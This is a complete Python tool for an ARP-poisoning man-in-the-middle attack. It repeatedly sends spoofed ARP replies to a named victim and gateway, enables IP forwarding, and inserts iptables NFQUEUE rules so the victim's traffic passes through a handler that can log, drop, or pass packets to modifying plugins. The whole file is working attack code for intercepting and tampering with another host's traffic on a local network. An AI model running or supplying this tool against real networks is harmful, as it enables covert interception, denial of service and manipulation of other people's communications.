#!/usr/bin/env python3
"""
arp_spoofer_nfqueue.py - ARP MITM using kernel forwarding + NFQUEUE.

Model:
- ARP-spoof victim and gateway so both send traffic to our MAC.
- Enable kernel IP forwarding so Linux acts as router.
- Use iptables + NFQUEUE to intercept FORWARD traffic to/from victim.
- In the NFQUEUE callback, we can:
    * view traffic
    * selectively DROP
    * or MODIFY (then ACCEPT)
    * Delegate to PLUGINS

Requirements:
    sudo apt install libnetfilter-queue-dev
    sudo apt install python3-scapy python3-netfilterqueue

Run example:
    sudo python3 arp_spoofer_nfqueue.py \
        --iface enx00e04c301548 \
        --victim 10.1.0.22 \
        --gateway 10.1.0.254 \
        --queue-num 1 \
        --view
"""

import argparse
import os
import signal
import subprocess
import sys
import time
from threading import Thread

from scapy.all import (
    ARP,
    Ether,
    IP,
    TCP,
    UDP,
    srp,
    sendp,
    conf,
)
from netfilterqueue import NetfilterQueue
from plugins import ALL_PLUGINS

POISON_INTERVAL = 2.0  # seconds between ARP bursts

running = True


# ---------------------------------------------------------------------------
# ARP helpers
# ---------------------------------------------------------------------------

def resolve_mac(ip: str, iface: str, tries: int = 6, timeout: int = 2) -> str | None:
    """
    Resolve MAC for an IP via ARP (broadcast + srp).
    """
    for _ in range(tries):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(pkt, timeout=timeout, iface=iface, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        time.sleep(0.2)
    return None


def send_unicast_arp_reply(
    target_ip: str,
    target_mac: str,
    spoof_ip: str,
    spoof_mac: str,
    iface: str,
    count: int = 3,
) -> None:
    """
    Tell `target_ip` (at MAC `target_mac`) that `spoof_ip` is at `spoof_mac`.
    """
    arp = ARP(
        op=2,
        psrc=spoof_ip,
        hwsrc=spoof_mac,
        pdst=target_ip,
        hwdst=target_mac,
    )
    frame = Ether(dst=target_mac, src=spoof_mac) / arp
    sendp(frame, iface=iface, count=count, verbose=False)


def poison_loop(ctx: dict) -> None:
    """
    Periodically poison victim and gateway.
    """
    global running
    while running:
        try:
            # Gateway: "victim_ip is at attacker_mac"
            send_unicast_arp_reply(
                ctx["gateway_ip"],
                ctx["gateway_mac"],
                ctx["victim_ip"],
                ctx["attacker_mac"],
                ctx["iface"],
                count=2,
            )
            # Victim: "gateway_ip is at attacker_mac"
            send_unicast_arp_reply(
                ctx["victim_ip"],
                ctx["victim_mac"],
                ctx["gateway_ip"],
                ctx["attacker_mac"],
                ctx["iface"],
                count=2,
            )
        except Exception as e:
            print(f"[!] poison exception: {e}")
        time.sleep(POISON_INTERVAL)


def restore_arp(ctx: dict) -> None:
    """
    Restore correct ARP mappings (best-effort).
    """
    try:
        # Restore gateway: gateway_ip is at gateway_mac
        send_unicast_arp_reply(
            ctx["gateway_ip"],
            ctx["gateway_mac"],
            ctx["gateway_ip"],
            ctx["gateway_mac"],
            ctx["iface"],
            count=4,
        )
        # Restore victim: victim_ip is at victim_mac
        send_unicast_arp_reply(
            ctx["victim_ip"],
            ctx["victim_mac"],
            ctx["victim_ip"],
            ctx["victim_mac"],
            ctx["iface"],
            count=4,
        )
        print("[+] ARP tables restored (best effort).")
    except Exception as e:
        print(f"[!] restore exception: {e}")


# ---------------------------------------------------------------------------
# sysctl / iptables helpers
# ---------------------------------------------------------------------------

def run_cmd(cmd: list[str]) -> None:
    try:
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {' '.join(cmd)} ({e})")


def get_ip_forward_state() -> str:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            return f.read().strip()
    except Exception:
        return "0"


def set_ip_forward(state: str) -> None:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(state + "\n")
    except PermissionError:
        # Fallback to sysctl
        run_cmd(["sysctl", "-w", f"net.ipv4.ip_forward={state}"])


def setup_iptables(victim_ip: str, queue_num: int) -> None:
    """
    Insert NFQUEUE rules for FORWARD traffic to/from victim.
    """
    print("[*] Adding iptables NFQUEUE rules for victim traffic...")
    rules = [
        ["iptables", "-I", "FORWARD", "-s", victim_ip, "-j", "NFQUEUE", "--queue-num", str(queue_num)],
        ["iptables", "-I", "FORWARD", "-d", victim_ip, "-j", "NFQUEUE", "--queue-num", str(queue_num)],
    ]
    for r in rules:
        run_cmd(r)


def cleanup_iptables(victim_ip: str, queue_num: int) -> None:
    """
    Delete NFQUEUE rules (best effort).
    """
    print("[*] Removing iptables NFQUEUE rules...")
    rules = [
        ["iptables", "-D", "FORWARD", "-s", victim_ip, "-j", "NFQUEUE", "--queue-num", str(queue_num)],
        ["iptables", "-D", "FORWARD", "-d", victim_ip, "-j", "NFQUEUE", "--queue-num", str(queue_num)],
    ]
    for r in rules:
        run_cmd(r)


# ---------------------------------------------------------------------------
# NFQUEUE packet processing
# ---------------------------------------------------------------------------

def should_drop_packet(ip_pkt: IP, ctx: dict) -> bool:
    """
    Decide whether to DROP this packet.
    """
    if ctx.get("drop"):
        return True
    return False


def log_packet(ip_pkt: IP, view: bool) -> None:
    if not view:
        return
    l4 = ip_pkt.payload
    proto_info = f"proto={ip_pkt.proto}"
    try:
        if isinstance(l4, TCP):
            proto_info = f"TCP {l4.sport}->{l4.dport} flags={l4.flags}"
        elif isinstance(l4, UDP):
            proto_info = f"UDP {l4.sport}->{l4.dport}"
    except Exception:
        pass

    print(f"[VIEW] {ip_pkt.src} -> {ip_pkt.dst}  {proto_info}")


def make_nfq_handler(ctx: dict, view: bool):
    """
    Return a callback suitable for NetfilterQueue.bind().
    """

    def handler(nfq_pkt):
        try:
            raw = nfq_pkt.get_payload()
            ip_pkt = IP(raw)
        except Exception:
            # Non-IP or parsing failure -> just accept to be safe
            nfq_pkt.accept()
            return

        # We only care about victim flows (iptables already restricted this,
        # but double-check to be explicit).
        if not (ip_pkt.src == ctx["victim_ip"] or ip_pkt.dst == ctx["victim_ip"]):
            nfq_pkt.accept()
            return

        log_packet(ip_pkt, view=view)

        if should_drop_packet(ip_pkt, ctx):
            print(f"[DROP] {ip_pkt.src} -> {ip_pkt.dst}")
            nfq_pkt.drop()
            return

        # Plugin processing
        for plugin in ALL_PLUGINS:
             if plugin.process_packet(ip_pkt, ctx):
                 # Plugin handled/consumed the packet. We drop the original.
                 nfq_pkt.drop()
                 return

        nfq_pkt.accept()

    return handler


# ---------------------------------------------------------------------------
# Signal handling
# ---------------------------------------------------------------------------

def sigint_handler_factory(ctx: dict, original_ipfwd: str, queue_num: int):
    def handler(sig, frame):
        global running
        running = False
        print("\n[!] SIGINT received - cleaning up, please wait...")

        # Stop poisoning and restore ARP
        restore_arp(ctx)

        # Restore iptables
        cleanup_iptables(ctx["victim_ip"], queue_num)

        # Restore original ip_forward state
        print(f"[*] Restoring net.ipv4.ip_forward={original_ipfwd}")
        set_ip_forward(original_ipfwd)

        print("[+] Cleanup done. Exiting.")
        sys.exit(0)
    return handler


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="ARP MITM using kernel forwarding + NFQUEUE.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--iface", required=True, help="Interface (e.g. eth0, wlo1)")
    parser.add_argument("--victim", required=True, help="Victim IP to MITM")
    parser.add_argument("--gateway", required=True, help="Gateway IP")
    parser.add_argument("--queue-num", type=int, default=1, help="NFQUEUE queue number")
    parser.add_argument("--view", action="store_true", help="Print traffic summaries")
    parser.add_argument("--drop", action="store_true", help="Drop all traffic to/from victim")

    # Register Plugin Args
    for plugin in ALL_PLUGINS:
        plugin.register_args(parser)

    args = parser.parse_args()

    # Configure Plugins
    for plugin in ALL_PLUGINS:
        plugin.configure(args)

    conf.iface = args.iface

    # Get attacker MAC
    try:
        attacker_mac = open(f"/sys/class/net/{args.iface}/address").read().strip()
    except Exception:
        attacker_mac = None
    if not attacker_mac:
        print("[-] Could not determine attacker MAC; aborting.")
        sys.exit(1)

    print("=" * 70)
    print("[*] ARP MITM via NFQUEUE")
    print("=" * 70)
    print(f"[+] Interface : {args.iface}")
    print(f"[+] Attacker  : {attacker_mac}")
    print(f"[+] Victim    : {args.victim}")
    print(f"[+] Gateway   : {args.gateway}")
    print(f"[+] NFQUEUE   : {args.queue_num}")
    print(f"[+] View mode : {'ON' if args.view else 'OFF'}")
    print(f"[+] Drop mode : {'ON' if args.drop else 'OFF'}")
    print(f"[+] Plugins   : {len(ALL_PLUGINS)} loaded")
    print("=" * 70)

    print("[*] Resolving MAC addresses...")
    gw_mac = resolve_mac(args.gateway, args.iface)
    vic_mac = resolve_mac(args.victim, args.iface)

    if not gw_mac:
        print("[-] Failed to resolve gateway MAC; aborting.")
        sys.exit(1)
    if not vic_mac:
        print("[-] Failed to resolve victim MAC; aborting.")
        sys.exit(1)

    print(f"[+] Gateway {args.gateway} -> {gw_mac}")
    print(f"[+] Victim  {args.victim} -> {vic_mac}")

    ctx = {
        "iface": args.iface,
        "victim_ip": args.victim,
        "gateway_ip": args.gateway,
        "victim_mac": vic_mac,
        "gateway_mac": gw_mac,
        "attacker_mac": attacker_mac,
        "drop": args.drop,
    }

    # Save original ip_forward state
    original_ipfwd = get_ip_forward_state()
    print(f"[*] Original net.ipv4.ip_forward={original_ipfwd}")

    # Enable IP forwarding
    print("[*] Enabling IP forwarding (net.ipv4.ip_forward=1)...")
    set_ip_forward("1")

    # Setup iptables rules
    setup_iptables(args.victim, args.queue_num)

    # Setup SIGINT handler
    signal.signal(signal.SIGINT, sigint_handler_factory(ctx, original_ipfwd, args.queue_num))

    # Start ARP poisoning thread
    print("[*] Sending initial ARP poison packets...")
    send_unicast_arp_reply(args.gateway, gw_mac, args.victim, attacker_mac, args.iface, count=4)
    send_unicast_arp_reply(args.victim, vic_mac, args.gateway, attacker_mac, args.iface, count=4)
    time.sleep(0.5)

    t_poison = Thread(target=poison_loop, args=(ctx,), daemon=True)
    t_poison.start()
    print("[*] Poison thread started.")

    # Bind NFQUEUE and start processing
    print(f"[*] Binding to NFQUEUE #{args.queue_num} and processing packets...")
    nfq = NetfilterQueue()
    nfq.bind(args.queue_num, make_nfq_handler(ctx, view=args.view))

    try:
        nfq.run()
    except KeyboardInterrupt:
        # Handled by our SIGINT handler
        pass
    finally:
        nfq.unbind()


if __name__ == "__main__":
    main()
